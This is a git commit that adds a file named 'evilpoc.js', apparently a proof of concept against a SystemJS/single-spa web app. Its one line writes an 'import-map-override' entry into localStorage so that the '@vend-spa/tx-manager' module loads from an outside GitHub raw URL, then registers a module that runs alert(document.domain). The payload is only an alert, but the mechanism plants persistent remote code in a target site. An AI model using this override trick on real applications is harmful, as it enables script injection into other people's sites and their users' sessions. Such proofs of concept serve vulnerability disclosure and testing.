d46a7d57c47f8a4e4acd37463f31b3f78f2137cb
tester80 <85442500+ngostuan@users.noreply.github.com>
2026-05-21 10:04:30 -0700

    Create evilpoc.js

---
+++ evilpoc.js
@@ -0,0 +1,2 @@
+
+localStorage.setItem("import-map-override:@vend-spa/tx-manager","https://raw.githubusercontent.com/ngostuan/test/refs/heads/main/evilpoc.js");System.register([],function(e){return{execute:function(){alert(document.domain)}}});
